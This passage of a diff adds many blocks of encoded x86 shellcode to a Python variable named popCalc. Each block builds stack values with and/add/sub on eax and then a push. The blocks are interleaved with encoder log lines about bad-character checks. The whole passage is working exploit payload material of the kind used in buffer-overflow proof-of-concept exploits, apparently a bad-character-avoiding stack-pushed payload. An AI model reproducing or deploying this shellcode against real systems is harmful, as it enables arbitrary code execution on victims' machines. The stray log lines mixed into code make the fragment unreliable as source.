@@ -1,0 +1,821 @@
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x32\x20\x21\x21" ## add  eax, 0x21212032
+popCalc += "\x05\x21\x10\x20\x20" ## add  eax, 0x20201021
+popCalc += "\x50"                 ## push eax
+[*] Encoding [65507850]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x30\x34\x30\x33" ## add  eax, 0x33303430
+popCalc += "\x05\x20\x44\x20\x32" ## add  eax, 0x32204420
+popCalc += "\x50"                 ## push eax
+[*] Encoding [45726e64]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x32\x37\x31\x23" ## add  eax, 0x23313732
+popCalc += "\x05\x32\x37\x41\x22" ## add  eax, 0x22413732
+popCalc += "\x50"                 ## push eax
+[*] Encoding [73514c62]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x31\x26\x31\x32" ## add  eax, 0x32312631
+popCalc += "\x05\x31\x26\x20\x41" ## add  eax, 0x41202631
+popCalc += "\x50"                 ## push eax
+[*] Encoding [51636350]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x30\x32\x32\x31" ## add  eax, 0x31323230
+popCalc += "\x05\x20\x31\x31\x20" ## add  eax, 0x20313120
+popCalc += "\x50"                 ## push eax
+[*] Encoding [757a4f4b]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x36\x37\x45\x43" ## add  eax, 0x43453736
+popCalc += "\x05\x25\x26\x34\x33" ## add  eax, 0x33342625
+popCalc += "\x05\x23\x25\x34\x32" ## add  eax, 0x32342523
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [33465035]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x23\x30\x23\x22" ## add  eax, 0x22233023
+popCalc += "\x05\x12\x20\x23\x11" ## add  eax, 0x11232012
+popCalc += "\x50"                 ## push eax
+[*] Encoding [5a436f70]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x41\x37\x32\x35" ## add  eax, 0x35323741
+popCalc += "\x05\x31\x36\x22\x34" ## add  eax, 0x34223631
+popCalc += "\x05\x31\x35\x22\x24" ## add  eax, 0x24223531
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [72504355]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x22\x30\x31" ## add  eax, 0x31302233
+popCalc += "\x05\x22\x21\x20\x41" ## add  eax, 0x41202122
+popCalc += "\x50"                 ## push eax
+[*] Encoding [57614b6f]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x37\x36\x31\x34" ## add  eax, 0x34313637
+popCalc += "\x05\x36\x25\x32\x33" ## add  eax, 0x33322536
+popCalc += "\x05\x35\x23\x31\x23" ## add  eax, 0x23312335
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [45646531]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x21\x33\x32\x23" ## add  eax, 0x23323321
+popCalc += "\x05\x10\x32\x32\x22" ## add  eax, 0x22323210
+popCalc += "\x50"                 ## push eax
+[*] Encoding [70694b6b]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x36\x26\x35\x30" ## add  eax, 0x30352636
+popCalc += "\x05\x35\x25\x34\x40" ## add  eax, 0x40342535
+popCalc += "\x50"                 ## push eax
+[*] Encoding [706f6a76]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x43\x35\x37\x41" ## add  eax, 0x41373543
+popCalc += "\x05\x33\x34\x36\x31" ## add  eax, 0x31363433
+popCalc += "\x05\x33\x34\x35\x31" ## add  eax, 0x31353433
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4c534664]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x32\x23\x32\x26" ## add  eax, 0x26322332
+popCalc += "\x05\x32\x23\x21\x26" ## add  eax, 0x26212332
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6c655548]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x24\x33\x33\x36" ## add  eax, 0x36333324
+popCalc += "\x05\x24\x22\x32\x36" ## add  eax, 0x36322224
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4f4b6d4f]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x37\x36\x36\x37" ## add  eax, 0x37363637
+popCalc += "\x05\x26\x36\x25\x26" ## add  eax, 0x26253626
+popCalc += "\x05\x25\x34\x23\x25" ## add  eax, 0x25233425
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6d4d754e]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x27\x33\x27\x37" ## add  eax, 0x37273327
+popCalc += "\x05\x27\x42\x26\x36" ## add  eax, 0x36264227
+popCalc += "\x50"                 ## push eax
+[*] Encoding [666c6830]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x20\x34\x36\x33" ## add  eax, 0x33363420
+popCalc += "\x05\x10\x34\x36\x33" ## add  eax, 0x33363410
+popCalc += "\x50"                 ## push eax
+[*] Encoding [7672726d]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x37\x31\x31\x33" ## add  eax, 0x33313137
+popCalc += "\x05\x36\x41\x41\x43" ## add  eax, 0x43414136
+popCalc += "\x50"                 ## push eax
+[*] Encoding [3548306c]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x36\x20\x24\x23" ## add  eax, 0x23242036
+popCalc += "\x05\x36\x10\x24\x12" ## add  eax, 0x12241036
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4b4f754a]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x35\x43\x37\x36" ## add  eax, 0x36374335
+popCalc += "\x05\x24\x33\x26\x25" ## add  eax, 0x25263324
+popCalc += "\x05\x24\x32\x25\x23" ## add  eax, 0x23253224
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4f4b674e]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x36\x34\x36\x37" ## add  eax, 0x37363436
+popCalc += "\x05\x25\x33\x25\x26" ## add  eax, 0x26253325
+popCalc += "\x05\x26\x33\x23\x25" ## add  eax, 0x25233326
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6f704b4c]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x36\x36\x41\x37" ## add  eax, 0x37413636
+popCalc += "\x05\x25\x25\x31\x36" ## add  eax, 0x36312525
+popCalc += "\x05\x24\x23\x31\x35" ## add  eax, 0x35312324
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [71547871]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x31\x34\x32\x31" ## add  eax, 0x31323431
+popCalc += "\x05\x40\x44\x22\x40" ## add  eax, 0x40224440
+popCalc += "\x50"                 ## push eax
+[*] Encoding [30667037]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x23\x30\x33\x20" ## add  eax, 0x20333023
+popCalc += "\x05\x14\x40\x33\x10" ## add  eax, 0x10334014
+popCalc += "\x50"                 ## push eax
+[*] Encoding [30635065]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x30\x32\x20" ## add  eax, 0x20323033
+popCalc += "\x05\x32\x20\x31\x10" ## add  eax, 0x10312032
+popCalc += "\x50"                 ## push eax
+[*] Encoding [626d554d]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x27\x33\x37\x31" ## add  eax, 0x31373327
+popCalc += "\x05\x26\x22\x36\x31" ## add  eax, 0x31362226
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4d4c7147]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x23\x31\x26\x27" ## add  eax, 0x27263123
+popCalc += "\x05\x24\x40\x26\x26" ## add  eax, 0x26264024
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4a326d53]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x32\x37\x21\x25" ## add  eax, 0x25213732
+popCalc += "\x05\x21\x36\x11\x25" ## add  eax, 0x25113621
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6d6e4b6a]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x35\x26\x37\x37" ## add  eax, 0x37372635
+popCalc += "\x05\x35\x25\x37\x36" ## add  eax, 0x36372535
+popCalc += "\x50"                 ## push eax
+[*] Encoding [72364b6c]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x36\x26\x23\x31" ## add  eax, 0x31232636
+popCalc += "\x05\x36\x25\x13\x41" ## add  eax, 0x41132536
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4a516f33]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x22\x37\x31\x35" ## add  eax, 0x35313722
+popCalc += "\x05\x22\x36\x32\x24" ## add  eax, 0x24323622
+popCalc += "\x05\x22\x35\x21\x24" ## add  eax, 0x24213522
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4f617059]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x34\x41\x31\x37" ## add  eax, 0x37314134
+popCalc += "\x05\x34\x31\x32\x26" ## add  eax, 0x26323134
+popCalc += "\x05\x24\x31\x31\x25" ## add  eax, 0x25313124
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4f6b3156]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x21\x36\x37" ## add  eax, 0x37362133
+popCalc += "\x05\x33\x22\x35\x26" ## add  eax, 0x26352233
+popCalc += "\x05\x23\x21\x33\x25" ## add  eax, 0x25332123
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [7a527932]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x21\x35\x31\x35" ## add  eax, 0x35313521
+popCalc += "\x05\x11\x44\x21\x45" ## add  eax, 0x45214411
+popCalc += "\x50"                 ## push eax
+[*] Encoding [51434b61]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x31\x26\x22\x31" ## add  eax, 0x31222631
+popCalc += "\x05\x30\x25\x21\x20" ## add  eax, 0x20212530
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6b533461]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x31\x22\x32\x36" ## add  eax, 0x36322231
+popCalc += "\x05\x30\x12\x21\x35" ## add  eax, 0x35211230
+popCalc += "\x50"                 ## push eax
+[*] Encoding [54673467]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x22\x33\x32" ## add  eax, 0x32332233
+popCalc += "\x05\x34\x12\x34\x22" ## add  eax, 0x22341234
+popCalc += "\x50"                 ## push eax
+[*] Encoding [696e706a]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x35\x30\x37\x35" ## add  eax, 0x35373035
+popCalc += "\x05\x35\x40\x37\x34" ## add  eax, 0x34374035
+popCalc += "\x50"                 ## push eax
+[*] Encoding [71376b6e]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x37\x36\x23\x31" ## add  eax, 0x31233637
+popCalc += "\x05\x37\x35\x14\x40" ## add  eax, 0x40143537
+popCalc += "\x50"                 ## push eax
+[*] Encoding [54754b6c]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x36\x26\x33\x32" ## add  eax, 0x32332636
+popCalc += "\x05\x36\x25\x42\x22" ## add  eax, 0x22422536
+popCalc += "\x50"                 ## push eax
+[*] Encoding [43395165]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x31\x25\x22" ## add  eax, 0x22253133
+popCalc += "\x05\x32\x20\x14\x21" ## add  eax, 0x21142032
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4c454861]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x31\x24\x23\x26" ## add  eax, 0x26232431
+popCalc += "\x05\x30\x24\x22\x26" ## add  eax, 0x26222430
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6b6e4b70]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x30\x26\x37\x36" ## add  eax, 0x36372630
+popCalc += "\x05\x40\x25\x37\x35" ## add  eax, 0x35372540
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6c466b4e]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x27\x36\x23\x36" ## add  eax, 0x36233627
+popCalc += "\x05\x27\x35\x23\x36" ## add  eax, 0x36233527
+popCalc += "\x50"                 ## push eax
+[*] Encoding [7651334e]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x27\x22\x31\x33" ## add  eax, 0x33312227
+popCalc += "\x05\x27\x11\x20\x43" ## add  eax, 0x43201127
+popCalc += "\x50"                 ## push eax
+[*] Encoding [61463471]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x31\x22\x23\x31" ## add  eax, 0x31232231
+popCalc += "\x05\x40\x12\x23\x30" ## add  eax, 0x30231240
+popCalc += "\x50"                 ## push eax
+[*] Encoding [58706b6e]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x37\x36\x30\x34" ## add  eax, 0x34303637
+popCalc += "\x05\x37\x35\x40\x24" ## add  eax, 0x24403537
+popCalc += "\x50"                 ## push eax
+[*] Encoding [3866344d]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x27\x22\x33\x24" ## add  eax, 0x24332227
+popCalc += "\x05\x26\x12\x33\x14" ## add  eax, 0x14331226
+popCalc += "\x50"                 ## push eax
+[*] Encoding [65514476]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x22\x31\x33" ## add  eax, 0x33312233
+popCalc += "\x05\x43\x22\x20\x32" ## add  eax, 0x32202243
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6d616b65]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x36\x31\x37" ## add  eax, 0x37313633
+popCalc += "\x05\x32\x35\x30\x36" ## add  eax, 0x36303532
+popCalc += "\x50"                 ## push eax
+[*] Encoding [584a4d63]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x32\x27\x25\x34" ## add  eax, 0x34252732
+popCalc += "\x05\x31\x26\x25\x24" ## add  eax, 0x24252631
+popCalc += "\x50"                 ## push eax
+[*] Encoding [7377366c]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x36\x23\x33\x32" ## add  eax, 0x32332336
+popCalc += "\x05\x36\x13\x44\x41" ## add  eax, 0x41441336
+popCalc += "\x50"                 ## push eax
+[*] Encoding [5562304d]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x27\x20\x31\x33" ## add  eax, 0x33312027
+popCalc += "\x05\x26\x10\x31\x22" ## add  eax, 0x22311026
+popCalc += "\x50"                 ## push eax
+[*] Encoding [5846376f]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x37\x24\x33\x34" ## add  eax, 0x34332437
+popCalc += "\x05\x36\x23\x23\x34" ## add  eax, 0x34232336
+popCalc += "\x05\x35\x23\x23\x23" ## add  eax, 0x23232335
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [31336d76]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x37\x22\x21" ## add  eax, 0x21223733
+popCalc += "\x05\x43\x36\x11\x10" ## add  eax, 0x10113643
+popCalc += "\x50"                 ## push eax
+[*] Encoding [4f48714b]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x36\x41\x34\x37" ## add  eax, 0x37344136
+popCalc += "\x05\x25\x32\x24\x26" ## add  eax, 0x26243225
+popCalc += "\x05\x23\x31\x23\x25" ## add  eax, 0x25233123
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6c6c6f69]..
+[!] Possible bad character found, using alterantive encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x34\x37\x36\x36" ## add  eax, 0x36363734
+popCalc += "\x05\x34\x36\x35\x35" ## add  eax, 0x35353634
+popCalc += "\x05\x34\x35\x34\x34" ## add  eax, 0x34343534
+popCalc += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
+popCalc += "\x50"                 ## push eax
+[*] Encoding [7134366e]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x37\x23\x22\x31" ## add  eax, 0x31222337
+popCalc += "\x05\x37\x13\x12\x40" ## add  eax, 0x40121337
+popCalc += "\x50"                 ## push eax
+[*] Encoding [51356b6e]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x37\x36\x23\x31" ## add  eax, 0x31233637
+popCalc += "\x05\x37\x35\x12\x20" ## add  eax, 0x20123537
+popCalc += "\x50"                 ## push eax
+[*] Encoding [64456b4e]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x27\x36\x23\x32" ## add  eax, 0x32233627
+popCalc += "\x05\x27\x35\x22\x32" ## add  eax, 0x32223527
+popCalc += "\x50"                 ## push eax
+[*] Encoding [69326a65]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x35\x21\x35" ## add  eax, 0x35213533
+popCalc += "\x05\x32\x35\x11\x34" ## add  eax, 0x34113532
+popCalc += "\x50"                 ## push eax
+[*] Encoding [63585854]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x32\x34\x34\x32" ## add  eax, 0x32343432
+popCalc += "\x05\x22\x24\x24\x31" ## add  eax, 0x31242422
+popCalc += "\x50"                 ## push eax
+[*] Encoding [49304b6c]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x36\x26\x20\x25" ## add  eax, 0x25202636
+popCalc += "\x05\x36\x25\x10\x24" ## add  eax, 0x24102536
+popCalc += "\x50"                 ## push eax
+[*] Encoding [737a7157]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x33\x31\x35\x32" ## add  eax, 0x32353133
+popCalc += "\x05\x24\x40\x45\x41" ## add  eax, 0x41454024
+popCalc += "\x50"                 ## push eax
+[*] Encoding [30717962]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+popCalc += "\x05\x31\x35\x31\x20" ## add  eax, 0x20313531
+popCalc += "\x05\x31\x44\x40\x10" ## add  eax, 0x10404431
+popCalc += "\x50"                 ## push eax
+[*] Encoding [6b6e3166]..
+[+] No bad character found, using default encoder..
+popCalc += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+popCalc += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
